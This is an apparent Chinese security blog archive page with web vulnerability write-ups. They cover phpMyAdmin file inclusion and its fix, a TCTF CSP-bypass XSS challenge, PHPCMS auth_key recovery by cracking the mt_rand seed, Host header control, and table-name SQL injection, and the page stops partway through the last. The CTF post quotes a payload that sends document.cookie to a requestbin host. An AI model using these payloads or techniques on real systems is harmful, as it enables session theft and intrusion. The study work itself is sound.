<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$session_name &#x3D; &#39;phpMyAdmin&#39;;</span><br><span class="line">@session_name($session_name);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Restore correct sesion ID (it might have been reset by auto started session</span><br><span class="line">if (isset($_COOKIE[&#39;phpMyAdmin&#39;])) &#123;</span><br><span class="line">    session_id($_COOKIE[&#39;phpMyAdmin&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>phpmyadmin的session_name 是phpMyAdmin</p>
<p>执行的sql语句存入session的有两个位置。 一个就是sql_history。<br>/libraries/classes/Relation.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;sql_history&#x27;</span>][] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;db&#x27;</span> =&gt; $db,</span><br><span class="line">    <span class="string">&#x27;table&#x27;</span> =&gt; $table,</span><br><span class="line">    <span class="string">&#x27;sqlquery&#x27;</span> =&gt; $sqlquery,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>这里的$sqlquery 就是所执行的sql语句, 然后存入到了$_SESSION当中。</p>
<hr>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>4.8.2中, 修复了这个漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (! empty($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#39;&#x2F;^index&#x2F;&#39;, $_REQUEST[&#39;target&#39;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;], [], true)</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#39;target&#39;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在调用checkPageValidity方法的时候, 第三个参数设置为了true</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array $whitelist &#x3D; [], $include &#x3D; false)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    if (empty($whitelist)) &#123;</span><br><span class="line">        $whitelist &#x3D; self::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (in_array($page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($include) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page &#x3D; mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        0,</span><br><span class="line">        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">    );</span><br><span class="line">    if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当第三个参数为true的时候, 在mb_substr之前, 就return false了。<br>所以, 现在真的只能包含白名单内的文件了。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/web/">web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2018/05/30/TCTF-h4x0rs-date/"><span>TCTF-h4x0rs.date</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/05/30/TCTF-h4x0rs-date/" rel="bookmark">
        <time class="entry-date published" datetime="2018-05-30T08:17:16.000Z">
          2018-05-30
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>TCTF的题, 看到了大佬的一种解法。 学习了一下这种解法的原理。<br><a target="_blank" rel="noopener" href="https://gist.github.com/tyage/8d8aead76ffc4924579783d72a63419f">https://gist.github.com/tyage/8d8aead76ffc4924579783d72a63419f</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;//requestbin.fullcontact.com/15g8ko51?&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">/profile.php?id</span>=<span class="string">c7ab51c5bdeec6bc6068d8a643a29907a1b7c71acb455454381fe7320cd5283e</span> <span class="attr">id</span>=<span class="string">msg</span> <span class="attr">csp</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p>看了这个解法我才知道iframe还有个csp属性。。</p>
<p>把题目简化一下。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://h4x0rs.date/assets/csp.js?id=&amp;page=index.php&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">可控点aaaaa</span><br></pre></td></tr></table></figure>

<p>引入的js内容, 是用来创建csp的, script-src的nonce是在变化的。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meta = document.createElement(&#x27;meta&#x27;);</span><br><span class="line">meta.httpEquiv=&#x27;Content-Security-Policy&#x27;;</span><br><span class="line">meta.content=&quot;script-src &#x27;nonce-_indexphp_604b540b26cfe37756638953a26ff7f9&#x27;&quot;;</span><br><span class="line">document.head.appendChild(meta);</span><br></pre></td></tr></table></figure>

<p>看一下iframe的csp是干啥的</p>
<blockquote>
<p>iframe elements have a csp attribute, which specifies the policy that an embedded document must agree to enforce upon itself. For example, the following HTML would load <a target="_blank" rel="noopener" href="https://embedee.example.com/">https://embedee.example.com/</a>, and ensure that object-src ‘none’ was enforced upon it:</p>
</blockquote>
<p>也就是说, 如果iframe标签中定义了csp属性的话, 加载嵌入的页面的时候会按照这个csp的规则来加载。</p>
<p>那么如果使用iframe来加载当前页面的话, 再定义csp为unsafe-inline, </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://h4x0rs.date/assets/csp.js?id=&amp;page=index.php&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样原本页面中引入csp.js的时候就会因为csp的原因被chrome给拦截掉,<br>即创建script-src 的nonce就失败了，则嵌入的页面当前csp依旧为unsafe-inline。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就可以执行了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;https://h4x0rs.date/assets/csp.js?id=&amp;page=index.php&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">1.html</span> <span class="attr">csp</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="http://onw16foqc.bkt.clouddn.com/15276662706306.jpg"></p>
<hr>
<p>如果js创建csp不是引入的外部js, 而就是在脚本内的话。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    meta = <span class="built_in">document</span>.createElement(<span class="string">&#x27;meta&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    meta.httpEquiv=<span class="string">&#x27;Content-Security-Policy&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    meta.content=<span class="string">&quot;script-src &#x27;nonce-_indexphp_604b540b26cfe37756638953a26ff7f9&#x27;&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.head.appendChild(meta);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:,alert(document.domain)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">1.html</span> <span class="attr">csp</span>=<span class="string">&quot;script-src data:&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>把csp改成script-src ,自己的域名, 或者data协议之类的即可。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/15276665012208.jpg"></p>
<hr>
<p>现在的浏览器应该暂时只有chrome支持iframe的csp属性。<br>大部分创建csp还是会在response header中来创建滴。</p>
<hr>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h2><ol>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/tyage/8d8aead76ffc4924579783d72a63419f">https://gist.github.com/tyage/8d8aead76ffc4924579783d72a63419f</a></li>
<li><a target="_blank" rel="noopener" href="https://w3c.github.io/webappsec-csp/embedded/">https://w3c.github.io/webappsec-csp/embedded/</a></li>
</ol>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2017/05/13/PHPCMS-MT-RAND-SEED-CRACK致authkey泄露。/"><span>PHPCMS MT_RAND SEED CRACK致authkey泄露。</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2017/05/13/PHPCMS-MT-RAND-SEED-CRACK致authkey泄露。/" rel="bookmark">
        <time class="entry-date published" datetime="2017-05-13T06:30:12.000Z">
          2017-05-13
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>看到phpcms更新了, 看了下补丁, 分析了下他修复的漏洞。</p>
<p>这种漏洞在CTF中还是比较常见的, 实例我还是第一次遇到。</p>
<hr>
<p>在INSTALL.PHP中</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14945986677331.jpg"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    $cookie_pre = random(<span class="number">5</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>).<span class="string">&#x27;_&#x27;</span>;$auth_key = random(<span class="number">20</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);		</span><br></pre></td></tr></table></figure>
<p>在安装的时候, 用random来生成了cookie_pre 和 authkey,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789&#x27;</span></span>) </span>&#123;</span><br><span class="line">	$hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">		$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了mt_rand来生成chars的索引来生成authkey之类的。<br>mt_rand 在一个脚本中, 产生多个随机数的时候, 只播了一次种。<br>那么也就是mt_rand生成cookie_pre和authkey的种子是一样的。<br>cookie_pre从名字就能看出这个是cookie名称的前缀, 所以是可以拿到的, 那么只要用cookie_pre爆破到了种子的话, 那么也就是拿到了生成authkey的种子。<br>因为种子确定了的话, 产生的随机数序列就可以确定了, 也就是每次的索引可以确定了, 就可以拿到auth_key了。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946511358285.jpg"></p>
<p>首先看到 COOKIE_PRE  为 AZZBP</p>
<p>这里直接用下wonderkun大佬的脚本, 来获取一下cookie_pre的各个字符串在序列中的位置。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$str = <span class="string">&quot;AZZBP&quot;</span>;</span><br><span class="line">$randStr = <span class="string">&quot;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   <span class="keyword">echo</span> $pos.<span class="string">&quot; &quot;</span>.$pos.<span class="string">&quot; &quot;</span>.<span class="string">&quot;0 &quot;</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">   <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>26 26 0 51 51 51 0 51 51 51 0 51 27 27 0 51 41 41 0 51</p>
<p>然后用<a target="_blank" rel="noopener" href="http://www.openwall.com/php_mt_seed/">MT_RAND SEED CRACKER</a>来爆破一下种子。</p>
<p>然后把爆破到的种子, 用mt_srand设置一下种子, 再来获得随机数列, 就能拿到authkey了。<br>因为爆破到的种子会有多个。 就一个一个慢慢试了。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946523923708.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946524083388.jpg"></p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946524181285.jpg"></p>
<p>在试第三个种子的时候就拿到了正确的auth_key了。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14946524562454.jpg"></p>
<p>拿到auth_key后 可以做的事情很多, 就不多说了。</p>
<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>官方的已经修复了。<br><img src="http://onw16foqc.bkt.clouddn.com/14946526464301.jpg"></p>
<p>多次播种了, 那么根据cookie_pre拿到的种子和生成auth_key的种子是不一样的, 所以authkey生成的序列就不知道咯。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2017/04/24/为什么$_SERVER['HTTP_HOST']有时是不可控的。/"><span>为什么$_SERVER[&#39;HTTP_HOST&#39;]有时是不可控的</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2017/04/24/为什么$_SERVER['HTTP_HOST']有时是不可控的。/" rel="bookmark">
        <time class="entry-date published" datetime="2017-04-24T01:35:11.000Z">
          2017-04-24
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>最近在看一套程序的时候, 看到一段代码。<br>如果SERVRT[&apos;HTTP_HOST&apos;]可以控制的话, 可以造成一个漏洞,<br>本地是测试成功了, 但是在测试demo的时候就失败掉了。<br>所以这里来谈谈SERVER[&apos;HTTP_HOST&apos;]为什么有时会不可控。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    GET &#x2F;123.php HTTP&#x2F;1.1</span><br><span class="line">    Host: localhost</span><br><span class="line">    User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">    Accept-Language: zh,en-US;q&#x3D;0.7,en;q&#x3D;0.3</span><br><span class="line">    Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>

<p>平时我们在抓包的时候, 都会发现包里会有个Host header, </p>
<p>一些同学会以为HTTP的联机就是靠包里的HOST header来连接的,<br>所以会认为如果修改掉包里的HOST, 那么就连接不到目标服务器,<br>所以是不可控的。</p>
<p>其实HTTP的联机与包里的HOST并没有啥关系, HTTP的联机是TCP/IP建立的, 所以修改掉HOST HEADER并不会把包丢到另外一个服务器上。</p>
<p>那么为什么有时候修改HOST HEADER的时候, 还是会请求失败掉。<br>其实包里的HOST HEADER, 主要是针对虚拟主机来使用的,<br>在一个ip上搭多个域名的时候,需要使用HOST HEADER来分辨交给哪个virtual host来处理。</p>
<hr>
<p>测试一下<br>在httpd.conf里添加了</p>
<pre><code>&lt;VirtualHost *:80&gt;
    DocumentRoot &quot;/tmp/web/ep1&quot;
    ServerName www.example.com
    &lt;Directory &quot;/tmp/web/ep1&quot;&gt;
       Options FollowSymLinks
       AllowOverride None
       Require all granted
    &lt;/Directory&gt;
&lt;/VirtualHost&gt;
&lt;VirtualHost _default_:80&gt;
    DocumentRoot &quot;/tmp/web/ep2&quot;
    ServerName www.example2.com
    &lt;Directory &quot;/tmp/web/ep2&quot;&gt;
       Options FollowSymLinks
       AllowOverride None
       Require all granted
    &lt;/Directory&gt;
&lt;/VirtualHost&gt;</code></pre>
<p>/tmp/ep2/ep2.php   <a target="_blank" rel="noopener" href="http://www.example2.com/">www.example2.com</a><br>/tmp/ep1/ep1.php   <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a></p>
<pre><code>&lt;?php
var_dump($_SERVER[&#39;HTTP_HOST&#39;]);</code></pre>
<p><img src="http://onw16foqc.bkt.clouddn.com/14929968127068.jpg"></p>
<p>在修改了HOST之后就404了。因为这个时候Host header 与 ServerName <a target="_blank" rel="noopener" href="http://www.example2.com/">www.example2.com</a> 匹配不上了, 所以现在并不是到目录/tmp/web/ep2了, 并不存在ep2.php</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14929968308100.jpg"></p>
<p>那么是不是虚拟主机的HTTP_HOST一定就没办法控制呢, 读一下文档</p>
<blockquote>
<p>The asterisks match all addresses, so the main server serves no requests. Due to the fact that the virtual host with ServerName <a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a> is first in the configuration file, it has the highest priority and can be seen as the default or primary server. That means that if a request is received that does not match one of the specified ServerName directives, it will be served by this first <VirtualHost>.</p>
</blockquote>
<p>也就是说, 在配置文件里, 第一个配置的virtualhost, 具有最高优先级, 如果HOST HEADER里的与配置文件里的所有vitualhost里的ServerName都匹配不上的话, 那就会是第一个来服务, 如果恰巧你测试的站是第一个的话…… 。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14929971076072.jpg"></p>
<p>这里的文件为ep1.php, 这里的HOST HEADER, 与ServerName 都匹配不上, 那么还是交给第一个来处理了, 所以ep1.php 能访问到, 然后修改掉了HTTP_HOST。</p>
<hr>
<p>不过这种漏洞也已经很鸡肋了, 在最新版本的apache(2.4.25)中, 已经不允许HOST HEADER中出现一些特殊字符了。不过在低版本中, 还是能引入单引号空格之类的字符的。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14929974434175.jpg"></p>
<blockquote>
<p>对请求行和请求头强制实施与RFC7230相对应的HTTP请求语法，以防止恶意客户端或下游代理对响应分裂和缓存污染</p>
</blockquote>
<p><img src="http://onw16foqc.bkt.clouddn.com/14929975153275.jpg"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2017/04/16/当表名可控的注入遇到了Describe时的几种情况。/"><span>当表名可控的注入遇到了Describe时的几种情况。</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2017/04/16/当表名可控的注入遇到了Describe时的几种情况。/" rel="bookmark">
        <time class="entry-date published" datetime="2017-04-16T13:52:13.000Z">
          2017-04-16
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="SHOW-COLUMNS"><a href="#SHOW-COLUMNS" class="headerlink" title="SHOW COLUMNS"></a>SHOW COLUMNS</h2><p>之前小嘎嘎遇到了个注入是表前缀不可控,表名可控的注入,<br>但是在表名进入的select语句执行之前, 执行了一次SHOW COLUMNS FROM $TABLE。<br>如果SHOW COLUMNS语句执行出错了的话,<br>就不会再执行后面的SELECT语句。</p>
<p>大概代码如:</p>
<pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
mysql_query(&quot;use b2cshop&quot;);
$table = $_GET[&#39;table&#39;];
mysql_query(&quot;show columns from `shop_&#123;$table&#125;`&quot;) or die(&quot;show coulumns 出错:&quot;.mysql_error());
$sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
echo $sql;
echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
echo mysql_error();</code></pre>
<p>要解这个, 首先来看一下 SHOW COLUMNS Syntax</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] COLUMNS &#123;FROM | IN&#125; tbl_name [&#123;FROM | IN&#125; db_name]</span><br><span class="line">    [LIKE &#39;pattern&#39; | WHERE expr]</span><br></pre></td></tr></table></figure>

<p>看到where 后面可以跟expr, 就很简单了。</p>
<p><img src="http://onw16foqc.bkt.clouddn.com/14923471160467.jpg"></p>
<hr>
<p>解决了这个, 让我想起了我好多年前遇到的另外一种, 他不是用的show columns 而是用的describe, 当年的我没解决掉, 所以又再去看了一眼,试试能不能解决掉。 DESC这种分为几种情况。</p>
<h2 id="DESCRIBE"><a href="#DESCRIBE" class="headerlink" title="DESCRIBE"></a>DESCRIBE</h2><blockquote>
<p>DESCRIBE is a shortcut for SHOW COLUMNS. These statements also display information for views. The description for SHOW COLUMNS provides more information about the output columns.</p>
</blockquote>
<p>虽然说的是 DESCRIBE 是 SHOW COLUMNS 的shortcut,但是其实两个语法完全不同。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;EXPLAIN | DESCRIBE | DESC&#125;</span><br><span class="line">    tbl_name [col_name | wild]</span><br><span class="line"></span><br><span class="line">&#123;EXPLAIN | DESCRIBE | DESC&#125;</span><br><span class="line">    [explain_type]</span><br><span class="line">    &#123;explainable_stmt | FOR CONNECTION connection_id&#125;</span><br><span class="line"></span><br><span class="line">explain_type: &#123;</span><br><span class="line">    EXTENDED</span><br><span class="line">  | PARTITIONS</span><br><span class="line">  | FORMAT &#x3D; format_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">format_name: &#123;</span><br><span class="line">    TRADITIONAL</span><br><span class="line">  | JSON</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">explainable_stmt: &#123;</span><br><span class="line">    SELECT statement</span><br><span class="line">  | DELETE statement</span><br><span class="line">  | INSERT statement</span><br><span class="line">  | REPLACE statement</span><br><span class="line">  | UPDATE statement</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分几种情况来讨论。</p>
<hr>
<h3 id="0x01-表名完全可控且无identifier-quote。"><a href="#0x01-表名完全可控且无identifier-quote。" class="headerlink" title="0x01 表名完全可控且无identifier quote。"></a>0x01 表名完全可控且无identifier quote。</h3><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
mysql_query(&quot;use b2cshop&quot;);
$table = $_GET[&#39;table&#39;];
mysql_query(&quot;desc $table&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
$sql = &quot;select * from &#123;$table&#125; where 1=1&quot;;
echo $sql;
echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
echo mysql_error();</code></pre>
<p>这种的,应该实例特别少。<br>利用比较简单, 根据文档写的构造一下, 直接利用desc 来注入。<br><img src="http://onw16foqc.bkt.clouddn.com/14923478923604.jpg"></p>
<h3 id="0x02-表名不完全可控且DESC和SELECT的表名都含有identifier-quote"><a href="#0x02-表名不完全可控且DESC和SELECT的表名都含有identifier-quote" class="headerlink" title="0x02 表名不完全可控且DESC和SELECT的表名都含有identifier quote"></a>0x02 表名不完全可控且DESC和SELECT的表名都含有identifier quote</h3><p>一般都是遇到的这种注入,会有表前缀是不可控的。</p>
<pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
mysql_query(&quot;use b2cshop&quot;);
$table = $_GET[&#39;table&#39;];
mysql_query(&quot;desc `shop_&#123;$table&#125;`&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
$sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
echo $sql;
